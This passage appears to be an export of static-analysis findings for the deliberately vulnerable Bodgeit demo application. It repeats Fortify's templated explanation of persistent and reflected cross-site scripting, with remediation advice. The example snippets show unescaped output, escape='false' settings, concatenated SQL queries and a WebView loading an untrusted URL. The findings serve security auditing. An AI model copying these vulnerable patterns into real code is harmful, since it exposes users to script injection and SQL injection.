<IfDef var=""ConditionalDescriptions""><Paragraph> <ConditionalText condition=""sink:java.io sink:javax.servlet trace:!jsp""> <b>Example 2:</b> The following code segment queries a database for an employee with a given ID and prints the corresponding employee's name in the servlet's response. <pre> ... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } ServletOutputStream out = response.getOutputStream(); out.print(""Employee Name: "" + name); ... out.close(); ... </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsp/jstl""> <b>Example 2:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name via the <code>&lt;c:out/&gt;</code> tag. By setting <code>escapeXml=""false""</code>, it does not perform even basic checking for potentially malicious data. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; Employee Name: &lt;c:out value=""${name}"" escapeXml=""false""/&gt; </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsp/jstl/fmt/message sink:jspwriter""> <b>Example 2:</b> The following JSP code segment queries a database for an employee with a given ID and looks up the corresponding employee's name in a bundle via the <code>key</code> attribute within the <code>&lt;fmt:message/&gt;</code> tag. If the key does not exist, the value passed to <code>key</code> gets printed to the page. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; &lt;fmt:setLocale value=""en""/&gt; &lt;fmt:setBundle basename=""com.company.Names"" var=""names""/&gt; Employee Name: &lt;fmt:message key=""&lt;%= name %&gt;"" bundle=""${names}""/&gt; </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsf trace:myfaces.apache.org/trinidad trace:myfaces.apache.org/tomahawk""> <b>Example 2:</b> The following code first queries a database for an employee with a given ID, converts the results into a list, and stores the list inside <code>employeesBean</code>. <pre> public class employeesBean { private List&lt;EmployeeData&gt; employeeList; ... public List&lt;EmployeeData&gt; getEmployeeList() { ... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); return convertToList(rs); } ... } </pre> Then it uses JSF's <code>dataTable</code> construct to print the corresponding employee's name. <pre> &lt;f:view&gt; ... &lt;h:dataTable value=""employeesBean.employeeList"" var=""employee""&gt; ... &lt;h:column&gt; &lt;f:facet name=""header""&gt; &lt;h:outputText value=""Employee Name""/&gt; &lt;/f:facet&gt; &lt;h:outputText value=""#{employee.name}"" escape=""false""/&gt; &lt;/h:column&gt; ... &lt;/h:dataTable&gt; ... &lt;/f:view&gt; </pre> </ConditionalText> <ConditionalText condition=""sink:_jspService sink:_jspInit sink:jspwriter trace:!/jsf|jstl|myfaces/""> <b>Example 2:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; Employee Name: &lt;%= name %&gt; </pre> </ConditionalText> <ConditionalText condition=""sink:!/java\.io|javax\.servlet|_jspInit|_jspService|jspwriter/""> <b>Example 2:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; Employee Name: &lt;%= name %&gt; </pre> </ConditionalText> </Paragraph></IfDef> As in Example 1, this code functions correctly when the values of <code>name</code> are well-behaved, but it does nothing to prevent exploits if they are not. Again, this code can appear less dangerous because the value of <code>name</code> is read from a database, whose contents are apparently managed by the application. However, if the value of <code>name</code> originates from user-supplied data, then the database can be a conduit for malicious content. Without proper input validation on all data stored in the database, an attacker can execute malicious commands in the user's web browser. This type of exploit, known as Persistent (or Stored) XSS, is particularly insidious because the indirection caused by the data store makes it more difficult to identify the threat and increases the possibility that the attack will affect multiple users. XSS got its start in this form with web sites that offered a ""guestbook"" to visitors. Attackers would include JavaScript in their guestbook entries, and all subsequent visitors to the guestbook page would execute the malicious code. Some think that in the mobile world, classic web application vulnerabilities, such as cross-site scripting, do not make sense -- why would the user attack themself? However, keep in mind that the essence of mobile platforms is applications that are downloaded from various sources and run alongside each other on the same device. The likelihood of running a piece of malware next to a banking application is high, which necessitates expanding the attack surface of mobile applications to include inter-process communication. <b>Example 3:</b> The following code enables JavaScript in Android's WebView (by default, JavaScript is disabled) and loads a page based on the value received from an Android intent. <pre> ... WebView webview = (WebView) findViewById(R.id.webview); webview.getSettings().setJavaScriptEnabled(true); String url = this.getIntent().getExtras().getString(""url""); webview.loadUrl(url); ... </pre> If the value of <code>url</code> starts with <code>javascript:</code>, JavaScript code that follows will execute within the context of the web page inside WebView. As the examples demonstrate, XSS vulnerabilities are caused by code that includes unvalidated data in an HTTP response. There are three vectors by which an XSS attack can reach a victim: - As in Example 1, data is read directly from the HTTP request and reflected back in the HTTP response. Reflected XSS exploits occur when an attacker causes a user to supply dangerous content to a vulnerable web application, which is then reflected back to the user and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or e-mailed directly to victims. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces victims to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the user, the content is executed and proceeds to transfer private information, such as cookies that may include session information, from the user's machine to the attacker or perform other nefarious activities. - As in Example 2, the application stores dangerous data in a database or other trusted data store. The dangerous data is subsequently read back into the application and included in dynamic content. Persistent XSS exploits occur when an attacker injects dangerous content into a data store that is later read and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user. - As in Example 3, a source outside the application stores dangerous data in a database or other data store, and the dangerous data is subsequently read back into the application as trusted data and included in dynamic content. <IfDef var=""ConditionalDescriptions""><Paragraph> <ConditionalText condition=""tracenode:form field validator tracenode:action form declaration tracenode:action declaration tracenode:action field validator tracenode:command class validator"">A number of modern web frameworks provide mechanisms for performing validation of user input. Struts and Spring MVC are among them. To highlight the unvalidated sources of input, the rulepacks dynamically re-prioritize the issues reported by HPE Security Fortify Static Code Analyzer by lowering their probability of exploit and providing pointers to the supporting evidence whenever the framework validation mechanism is in use. We refer to this feature as Context-Sensitive Ranking. To further assist the HPE Security Fortify user with the auditing process, the HPE Security Fortify Software Security Research Group makes available the Data Validation project template that groups the issues into folders based on the validation mechanism applied to their source of input.</ConditionalText> </Paragraph></IfDef> <IfNotDef var=""ConditionalDescriptions""> A number of modern web frameworks provide mechanisms for performing validation of user input. Struts and Spring MVC are among them. To highlight the unvalidated sources of input, the rulepacks dynamically re-prioritize the issues reported by HPE Security Fortify Static Code Analyzer by lowering their probability of exploit and providing pointers to the supporting evidence whenever the framework validation mechanism is in use. We refer to this feature as Context-Sensitive Ranking. To further assist the HPE Security Fortify user with the auditing process, the HPE Security Fortify Software Security Research Group makes available the Data Validation project template that groups the issues into folders based on the validation mechanism applied to their source of input. </IfNotDef></Content>","Recommendations: <Content>The solution to XSS is to ensure that validation occurs in the correct places and checks for the correct properties. Since XSS vulnerabilities occur when an application includes malicious data in its output, one logical approach is to validate data immediately before it leaves the application. However, because web applications often have complex and intricate code for generating dynamic content, this method is prone to errors of omission (missing validation). An effective way to mitigate this risk is to also perform input validation for XSS. Web applications must validate their input to prevent other vulnerabilities, such as SQL injection, so augmenting an application's existing input validation mechanism to include checks for XSS is generally relatively easy. Despite its value, input validation for XSS does not take the place of rigorous output validation. An application may accept input through a shared data store or other trusted source, and that data store may accept input from a source that does not perform adequate input validation. Therefore, the application cannot implicitly rely on the safety of this or any other data. This means the best way to prevent XSS vulnerabilities is to validate everything that enters the application and leaves the application destined for the user. The most secure approach to validation for XSS is to create a whitelist of safe characters that are allowed to appear in HTTP content and accept input composed exclusively of characters in the approved set. For example, a valid username might only include alpha-numeric characters or a phone number might only include digits 0-9. However, this solution is often infeasible in web applications because many characters that have special meaning to the browser should still be considered valid input once they are encoded, such as a web design bulletin board that must accept HTML fragments from its users. A more flexible, but less secure approach is known as blacklisting, which selectively rejects or escapes potentially dangerous characters before using the input. In order to form such a list, you first need to understand the set of characters that hold special meaning for web browsers. Although the HTML standard defines what characters have special meaning, many web browsers try to correct common mistakes in HTML and may treat other characters as special in certain contexts, which is why we do not encourage the use of blacklists as a means to prevent XSS. The CERT(R) Coordination Center at the Software Engineering Institute at Carnegie Mellon University provides the following details about special characters in various contexts [1]: In the content of a block-level element (in the middle of a paragraph of text): - ""&lt;"" is special because it introduces a tag. - ""&amp;"" is special because it introduces a character entity. - ""&gt;"" is special because some browsers treat it as special, on the assumption that the author of the page intended to include an opening ""&lt;"", but omitted it in error. The following principles apply to attribute values: - In attribute values enclosed with double quotes, the double quotes are special because they mark the end of the attribute value. - In attribute values enclosed with single quote, the single quotes are special because they mark the end of the attribute value. - In attribute values without any quotes, white-space characters, such as space and tab, are special. - ""&amp;"" is special when used with certain attributes, because it introduces a character entity. In URLs, for example, a search engine might provide a link within the results page that the user can click to re-run the search. This can be implemented by encoding the search query inside the URL, which introduces additional special characters: - Space, tab, and new line are special because they mark the end of the URL. - ""&amp;"" is special because it either introduces a character entity or separates CGI parameters. - Non-ASCII characters (that is, everything above 128 in the ISO-8859-1 encoding) are not allowed in URLs, so they are considered to be special in this context. - The ""%"" symbol must be filtered from input anywhere parameters encoded with HTTP escape sequences are decoded by server-side code. For example, ""%"" must be filtered if input such as ""%68%65%6C%6C%6F"" becomes ""hello"" when it appears on the web page in question. Within the body of a &lt;SCRIPT&gt; &lt;/SCRIPT&gt;: - Semicolons, parentheses, curly braces, and new line characters should be filtered out in situations where text could be inserted directly into a pre-existing script tag. Server-side scripts: - Server-side scripts that convert any exclamation characters (!) in input to double-quote characters ("") on output might require additional filtering. Other possibilities: - If an attacker submits a request in UTF-7, the special character '&lt;' appears as '+ADw-' and may bypass filtering. If the output is included in a page that does not explicitly specify an encoding format, then some browsers try to intelligently identify the encoding based on the content (in this case, UTF-7). Once you identify the correct points in an application to perform validation for XSS attacks and what special characters the validation should consider, the next challenge is to identify how your validation handles special characters. If special characters are not considered valid input to the application, then you can reject any input that contains special characters as invalid. A second option in this situation is to remove special characters with filtering. However, filtering has the side effect of changing any visual representation of the filtered content and may be unacceptable in circumstances where the integrity of the input must be preserved for display. If input containing special characters must be accepted and displayed accurately, validation must encode any special characters to remove their significance. A complete list of ISO 8859-1 encoded values for special characters is provided as part of the official HTML specification [2]. Many application servers attempt to limit an application's exposure to cross-site scripting vulnerabilities by providing implementations for the functions responsible for setting certain specific HTTP response content that perform validation for the characters essential to a cross-site scripting attack. Do not rely on the server running your application to make it secure. When an application is developed there are no guarantees about what application servers it will run on during its lifetime. As standards and known exploits evolve, there are no guarantees that application servers will also stay in sync.</Content> Tips: 1.The HPE Security Fortify Secure Coding Rulepacks warn about SQL Injection and Access Control: Database issues when untrusted data is written to a database and also treat the database as a source of untrusted data, which can lead to XSS vulnerabilities. If the database is a trusted resource in your environment, use custom filters to filter out dataflow issues that include the DATABASE taint flag or originate from database sources. Nonetheless, it is often still a good idea to validate everything read from the database. 2.Even though URL encoding untrusted data protects against many XSS attacks, some browsers (specifically, Internet Explorer 6 and 7 and possibly others) automatically decode content at certain locations within the Document Object Model (DOM) prior to passing it to the JavaScript interpreter. To reflect this danger, the rulepacks no longer treat URL encoding routines as sufficient to protect against cross-site scripting. Data values that are URL encoded and subsequently output will cause Fortify to report Cross-Site Scripting: Poor Validation vulnerabilities. 3.Fortify RTA adds protection against this category.","","",""
"DemoApps","","Bodgeit","259","Cross-Site Scripting: Persistent","","Critical","Open","2015-10-15","Fortify SCA,Checkmarx","79","Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')","A3","root/contact.jsp","","","http://localhost/root/contact.jsp","","","","Abstract: <Content><Paragraph>The method <Replace key=""EnclosingFunction.name""/> in <Replace key=""PrimaryLocation.file""/> sends unvalidated data to a web browser on line <Replace key=""PrimaryLocation.line""/>, which can result in the browser executing malicious code.<AltParagraph>Sending unvalidated data to a web browser can result in the browser executing malicious code.</AltParagraph></Paragraph></Content> Explanation: <Content>Cross-site scripting (XSS) vulnerabilities occur when: 1. Data enters a web application through an untrusted source. In the case of Persistent (also known as Stored) XSS, the untrusted source is typically a database or other back-end datastore, while in the case of Reflected XSS it is typically a web request. <Paragraph> In this case the data enters at <Replace key=""SourceFunction"" link=""SourceLocation""/> in <Replace key=""SourceLocation.file""/> at line <Replace key=""SourceLocation.line""/>. </Paragraph> 2. The data is included in dynamic content that is sent to a web user without being validated. <Paragraph> In this case the data is sent at <Replace key=""SinkFunction"" link=""SinkLocation""/> in <Replace key=""SinkLocation.file""/> at line <Replace key=""SinkLocation.line""/>. </Paragraph> The malicious content sent to the web browser often takes the form of a segment of JavaScript, but may also include HTML, Flash or any other type of code that the browser may execute. The variety of attacks based on XSS is almost limitless, but they commonly include transmitting private data like cookies or other session information to the attacker, redirecting the victim to web content controlled by the attacker, or performing other malicious operations on the user's machine under the guise of the vulnerable site. <IfNotDef var=""ConditionalDescriptions""> <b>Example 1:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; Employee Name: &lt;%= name %&gt; </pre> </IfNotDef> <IfDef var=""ConditionalDescriptions""><Paragraph> <ConditionalText condition=""sink:java.io sink:javax.servlet trace:!jsp""> <b>Example 1:</b> The following code segment queries a database for an employee with a given ID and prints the corresponding employee's name in the servlet response. <pre> ... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } ServletOutputStream out = response.getOutputStream(); out.print(""Employee Name: "" + name); ... out.close(); ... </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsp/jstl""> <b>Example 1:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name via the <code>&lt;c:out/&gt;</code> tag. By setting <code>escapeXml=""false""</code>, it does not perform even basic checking for potentially malicious data. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; Employee Name: &lt;c:out value=""${name}"" escapeXml=""false""/&gt; </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsf trace:myfaces.apache.org/trinidad trace:myfaces.apache.org/tomahawk""> <b>Example 1:</b> The following code first queries a database for an employee with a given ID, converts the results into a list, and stores the list inside <code>employeesBean</code>. <pre> public class employeesBean { private List&lt;EmployeeData&gt; employeeList; ... public List&lt;EmployeeData&gt; getEmployeeList() { ... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); return convertToList(rs); } ... } </pre> Then it uses JSF's <code>dataTable</code> construct to print the corresponding employee's name. <pre> &lt;f:view&gt; ... &lt;h:dataTable value=""employeesBean.employeeList"" var=""employee""&gt; ... &lt;h:column&gt; &lt;f:facet name=""header""&gt; &lt;h:outputText value=""Employee Name""&gt; &lt;/f:facet&gt; &lt;h:outputText value=""#{employee.name}"" escape=""false""/&gt; &lt;/h:column&gt; ... &lt;/h:dataTable&gt; ... &lt;/f:view&gt;</pre> </ConditionalText> <ConditionalText condition=""sink:_jspService sink:_jspInit sink:jspwriter trace:!/jsf|jstl|myfaces/""> <b>Example 1:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; Employee Name: &lt;%= name %&gt; </pre> </ConditionalText> <ConditionalText condition=""sink:!/java\.io|javax\.servlet|_jspInit|_jspService|jspwriter/""> <b>Example 1:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; Employee Name: &lt;%= name %&gt; </pre> </ConditionalText> </Paragraph></IfDef> This code functions correctly when the values of <code>name</code> are well-behaved, but it does nothing to prevent exploits if they are not. This code can appear less dangerous because the value of <code>name</code> is read from a database, whose contents are apparently managed by the application. However, if the value of <code>name</code> originates from user-supplied data, then the database can be a conduit for malicious content. Without proper input validation on all data stored in the database, an attacker can execute malicious commands in the user's web browser. This type of exploit, known as Persistent (or Stored) XSS, is particularly insidious because the indirection caused by the data store makes it more difficult to identify the threat and increases the possibility that the attack will affect multiple users. XSS got its start in this form with web sites that offered a ""guestbook"" to visitors. Attackers would include JavaScript in their guestbook entries, and all subsequent visitors to the guestbook page would execute the malicious code. <IfNotDef var=""ConditionalDescriptions""> <b>Example 2:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user. <pre> &lt;% String eid = request.getParameter(""eid""); %&gt; ... Employee ID: &lt;%= eid %&gt; </pre> </IfNotDef> <IfDef var=""ConditionalDescriptions""><Paragraph> <ConditionalText condition=""sink:java.io sink:javax.servlet trace:!jsp""> <b>Example 2:</b> The following code reads an employee ID, <code>eid</code>, from an HTTP servlet request, then displays the value back to the user in the servlet's response. <pre> String eid = request.getParameter(""eid""); ... ServletOutputStream out = response.getOutputStream(); out.print(""Employee ID: "" + eid); ... out.close(); ... </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsp/jstl""> <b>Example 2:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user via the <code>&lt;c:out/&gt;</code> tag. By setting <code>escapeXml=""false""</code>, it does not perform even basic checking for potentially malicious data. <pre> Employee ID: &lt;c:out value=""${param.eid}"" escapeXml=""false""/&gt; </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsf trace:myfaces.apache.org/trinidad trace:myfaces.apache.org/tomahawk""> <b>Example 2:</b> The following code reads an employee ID, <code>eid</code>, from a JSF form. <pre> ... &lt;h:form&gt; Enter employee ID: &lt;h:inputText value=""#{eid}""/&gt; &lt;/h:form&gt; ... </pre> Its response page then reads the value of <code>eid</code> and displays it to the user. <pre> ... Employee ID: &lt;h:outputText value=""#{eid}"" escape=""false""/&gt; ... </pre> </ConditionalText> <ConditionalText condition=""sink:_jspService sink:_jspInit sink:jspwriter trace:!/jsf|jstl|myfaces/""> <b>Example 2:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user. <pre> &lt;% String eid = request.getParameter(""eid""); %&gt; ... Employee ID: &lt;%= eid %&gt; </pre> </ConditionalText> <ConditionalText condition=""sink:!/java\.io|javax\.servlet|_jspInit|_jspService|jspwriter/""> <b>Example 2:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user. <pre> &lt;% String eid = request.getParameter(""eid""); %&gt; ... Employee ID: &lt;%= eid %&gt;</pre> </ConditionalText> </Paragraph></IfDef> As in Example 1, this code operates correctly if <code>eid</code> contains only standard alphanumeric text. If <code>eid</code> has a value that includes meta-characters or source code, then the code will be executed by the web browser as it displays the HTTP response. Initially this might not appear to be much of a vulnerability. After all, why would someone enter a URL that causes malicious code to run on their own computer? The real danger is that an attacker will create the malicious URL, then use e-mail or social engineering tricks to lure victims into visiting a link to the URL. When victims click the link, they unwittingly reflect the malicious content through the vulnerable web application back to their own computers. This mechanism of exploiting vulnerable web applications is known as Reflected XSS. Some think that in the mobile world, classic web application vulnerabilities, such as cross-site scripting, do not make sense -- why would the user attack themself? However, keep in mind that the essence of mobile platforms is applications that are downloaded from various sources and run alongside each other on the same device. The likelihood of running a piece of malware next to a banking application is high, which necessitates expanding the attack surface of mobile applications to include inter-process communication. <b>Example 3:</b> The following code enables JavaScript in Android's WebView (by default, JavaScript is disabled) and loads a page based on the value received from an Android intent. <pre> ... WebView webview = (WebView) findViewById(R.id.webview); webview.getSettings().setJavaScriptEnabled(true); String url = this.getIntent().getExtras().getString(""url""); webview.loadUrl(url); ... </pre> If the value of <code>url</code> starts with <code>javascript:</code>, JavaScript code that follows will execute within the context of the web page inside WebView. As the examples demonstrate, XSS vulnerabilities are caused by code that includes unvalidated data in an HTTP response. There are three vectors by which an XSS attack can reach a victim: - As in Example 1, the application stores dangerous data in a database or other trusted data store. The dangerous data is subsequently read back into the application and included in dynamic content. Persistent XSS exploits occur when an attacker injects dangerous content into a data store that is later read and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user. - As in Example 2, data is read directly from the HTTP request and reflected back in the HTTP response. Reflected XSS exploits occur when an attacker causes a user to supply dangerous content to a vulnerable web application, which is then reflected back to the user and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or e-mailed directly to victims. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces victims to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the user, the content is executed and proceeds to transfer private information, such as cookies that may include session information, from the user's machine to the attacker or perform other nefarious activities. - As in Example 3, a source outside the application stores dangerous data in a database or other data store, and the dangerous data is subsequently read back into the application as trusted data and included in dynamic content. <IfDef var=""ConditionalDescriptions""><Paragraph> <ConditionalText condition=""tracenode:form field validator tracenode:action form declaration tracenode:action declaration tracenode:action field validator tracenode:command class validator"">A number of modern web frameworks provide mechanisms for performing validation of user input. Struts and Spring MVC are among them. To highlight the unvalidated sources of input, the rulepacks dynamically re-prioritize the issues reported by HPE Security Fortify Static Code Analyzer by lowering their probability of exploit and providing pointers to the supporting evidence whenever the framework validation mechanism is in use. We refer to this feature as Context-Sensitive Ranking. To further assist the HPE Security Fortify user with the auditing process, the HPE Security Fortify Software Security Research Group makes available the Data Validation project template that groups the issues into folders based on the validation mechanism applied to their source of input.</ConditionalText> </Paragraph></IfDef> <IfNotDef var=""ConditionalDescriptions""> A number of modern web frameworks provide mechanisms for performing validation of user input. Struts and Spring MVC are among them. To highlight the unvalidated sources of input, the rulepacks dynamically re-prioritize the issues reported by HPE Security Fortify Static Code Analyzer by lowering their probability of exploit and providing pointers to the supporting evidence whenever the framework validation mechanism is in use. We refer to this feature as Context-Sensitive Ranking. To further assist the HPE Security Fortify user with the auditing process, the HPE Security Fortify Software Security Research Group makes available the Data Validation project template that groups the issues into folders based on the validation mechanism applied to their source of input. </IfNotDef></Content>","Recommendations: <Content>The solution to XSS is to ensure that validation occurs in the correct places and checks for the correct properties. Since XSS vulnerabilities occur when an application includes malicious data in its output, one logical approach is to validate data immediately before it leaves the application. However, because web applications often have complex and intricate code for generating dynamic content, this method is prone to errors of omission (missing validation). An effective way to mitigate this risk is to also perform input validation for XSS. Web applications must validate their input to prevent other vulnerabilities, such as SQL injection, so augmenting an application's existing input validation mechanism to include checks for XSS is generally relatively easy. Despite its value, input validation for XSS does not take the place of rigorous output validation. An application may accept input through a shared data store or other trusted source, and that data store may accept input from a source that does not perform adequate input validation. Therefore, the application cannot implicitly rely on the safety of this or any other data. This means the best way to prevent XSS vulnerabilities is to validate everything that enters the application and leaves the application destined for the user. The most secure approach to validation for XSS is to create a whitelist of safe characters that are allowed to appear in HTTP content and accept input composed exclusively of characters in the approved set. For example, a valid username might only include alpha-numeric characters or a phone number might only include digits 0-9. However, this solution is often infeasible in web applications because many characters that have special meaning to the browser should still be considered valid input once they are encoded, such as a web design bulletin board that must accept HTML fragments from its users. A more flexible, but less secure approach is known as blacklisting, which selectively rejects or escapes potentially dangerous characters before using the input. In order to form such a list, you first need to understand the set of characters that hold special meaning for web browsers. Although the HTML standard defines what characters have special meaning, many web browsers try to correct common mistakes in HTML and may treat other characters as special in certain contexts, which is why we do not encourage the use of blacklists as a means to prevent XSS. The CERT(R) Coordination Center at the Software Engineering Institute at Carnegie Mellon University provides the following details about special characters in various contexts [1]: In the content of a block-level element (in the middle of a paragraph of text): - ""&lt;"" is special because it introduces a tag. - ""&amp;"" is special because it introduces a character entity. - ""&gt;"" is special because some browsers treat it as special, on the assumption that the author of the page intended to include an opening ""&lt;"", but omitted it in error. The following principles apply to attribute values: - In attribute values enclosed with double quotes, the double quotes are special because they mark the end of the attribute value. - In attribute values enclosed with single quote, the single quotes are special because they mark the end of the attribute value. - In attribute values without any quotes, white-space characters, such as space and tab, are special. - ""&amp;"" is special when used with certain attributes, because it introduces a character entity. In URLs, for example, a search engine might provide a link within the results page that the user can click to re-run the search. This can be implemented by encoding the search query inside the URL, which introduces additional special characters: - Space, tab, and new line are special because they mark the end of the URL. - ""&amp;"" is special because it either introduces a character entity or separates CGI parameters. - Non-ASCII characters (that is, everything above 128 in the ISO-8859-1 encoding) are not allowed in URLs, so they are considered to be special in this context. - The ""%"" symbol must be filtered from input anywhere parameters encoded with HTTP escape sequences are decoded by server-side code. For example, ""%"" must be filtered if input such as ""%68%65%6C%6C%6F"" becomes ""hello"" when it appears on the web page in question. Within the body of a &lt;SCRIPT&gt; &lt;/SCRIPT&gt;: - Semicolons, parentheses, curly braces, and new line characters should be filtered out in situations where text could be inserted directly into a pre-existing script tag. Server-side scripts: - Server-side scripts that convert any exclamation characters (!) in input to double-quote characters ("") on output might require additional filtering. Other possibilities: - If an attacker submits a request in UTF-7, the special character '&lt;' appears as '+ADw-' and may bypass filtering. If the output is included in a page that does not explicitly specify an encoding format, then some browsers try to intelligently identify the encoding based on the content (in this case, UTF-7). Once you identify the correct points in an application to perform validation for XSS attacks and what special characters the validation should consider, the next challenge is to identify how your validation handles special characters. If special characters are not considered valid input to the application, then you can reject any input that contains special characters as invalid. A second option in this situation is to remove special characters with filtering. However, filtering has the side effect of changing any visual representation of the filtered content and may be unacceptable in circumstances where the integrity of the input must be preserved for display. If input containing special characters must be accepted and displayed accurately, validation must encode any special characters to remove their significance. A complete list of ISO 8859-1 encoded values for special characters is provided as part of the official HTML specification [2]. Many application servers attempt to limit an application's exposure to cross-site scripting vulnerabilities by providing implementations for the functions responsible for setting certain specific HTTP response content that perform validation for the characters essential to a cross-site scripting attack. Do not rely on the server running your application to make it secure. When an application is developed there are no guarantees about what application servers it will run on during its lifetime. As standards and known exploits evolve, there are no guarantees that application servers will also stay in sync.</Content> Tips: 1.The HPE Security Fortify Secure Coding Rulepacks warn about SQL Injection and Access Control: Database issues when untrusted data is written to a database and also treat the database as a source of untrusted data, which can lead to XSS vulnerabilities. If the database is a trusted resource in your environment, use custom filters to filter out dataflow issues that include the DATABASE taint flag or originate from database sources. Nonetheless, it is often still a good idea to validate everything read from the database. 2.Even though URL encoding untrusted data protects against many XSS attacks, some browsers (specifically, Internet Explorer 6 and 7 and possibly others) automatically decode content at certain locations within the Document Object Model (DOM) prior to passing it to the JavaScript interpreter. To reflect this danger, the rulepacks no longer treat URL encoding routines as sufficient to protect against cross-site scripting. Data values that are URL encoded and subsequently output will cause Fortify to report Cross-Site Scripting: Poor Validation vulnerabilities. 3.Fortify RTA adds protection against this category.","","",""
"DemoApps","","Bodgeit","145","Cross-Site Scripting: Persistent","","Critical","Open","2015-10-15","Fortify SCA","79","Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')","A3","root/contact.jsp","anticsrf","","http://localhost/root/contact.jsp","","","","Abstract: <Content><Paragraph>The method <Replace key=""EnclosingFunction.name""/> in <Replace key=""PrimaryLocation.file""/> sends unvalidated data to a web browser on line <Replace key=""PrimaryLocation.line""/>, which can result in the browser executing malicious code.<AltParagraph>Sending unvalidated data to a web browser can result in the browser executing malicious code.</AltParagraph></Paragraph></Content> Explanation: <Content>Cross-site scripting (XSS) vulnerabilities occur when: 1. Data enters a web application through an untrusted source. In the case of Persistent (also known as Stored) XSS, the untrusted source is typically a database or other back-end datastore, while in the case of Reflected XSS it is typically a web request. <Paragraph> In this case the data enters at <Replace key=""SourceFunction"" link=""SourceLocation""/> in <Replace key=""SourceLocation.file""/> at line <Replace key=""SourceLocation.line""/>. </Paragraph> 2. The data is included in dynamic content that is sent to a web user without being validated. <Paragraph> In this case the data is sent at <Replace key=""SinkFunction"" link=""SinkLocation""/> in <Replace key=""SinkLocation.file""/> at line <Replace key=""SinkLocation.line""/>. </Paragraph> The malicious content sent to the web browser often takes the form of a segment of JavaScript, but may also include HTML, Flash or any other type of code that the browser may execute. The variety of attacks based on XSS is almost limitless, but they commonly include transmitting private data like cookies or other session information to the attacker, redirecting the victim to web content controlled by the attacker, or performing other malicious operations on the user's machine under the guise of the vulnerable site. <IfNotDef var=""ConditionalDescriptions""> <b>Example 1:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; Employee Name: &lt;%= name %&gt; </pre> </IfNotDef> <IfDef var=""ConditionalDescriptions""><Paragraph> <ConditionalText condition=""sink:java.io sink:javax.servlet trace:!jsp""> <b>Example 1:</b> The following code segment queries a database for an employee with a given ID and prints the corresponding employee's name in the servlet response. <pre> ... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = 